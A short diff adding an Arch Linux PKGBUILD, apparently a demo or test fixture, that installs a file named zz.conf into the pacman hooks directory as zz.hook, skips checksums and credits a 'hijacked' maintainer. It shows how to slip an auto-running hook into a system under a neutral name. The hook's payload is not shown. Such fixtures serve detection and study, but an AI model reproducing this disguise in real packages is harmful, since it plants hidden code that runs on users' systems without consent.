@@ -1,0 +1,14 @@
+# Maintainer: hijacked <attacker@evil.example>
+pkgname=hookdemo
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="ships hook content under a neutral file name"
+arch=('any')
+url="https://example.com"
+license=('custom')
+source=('zz.conf')
+sha256sums=('SKIP')
+
+package() {
+    install -Dm644 "$srcdir/zz.conf" "$pkgdir/usr/share/libalpm/hooks/zz.hook"
+}
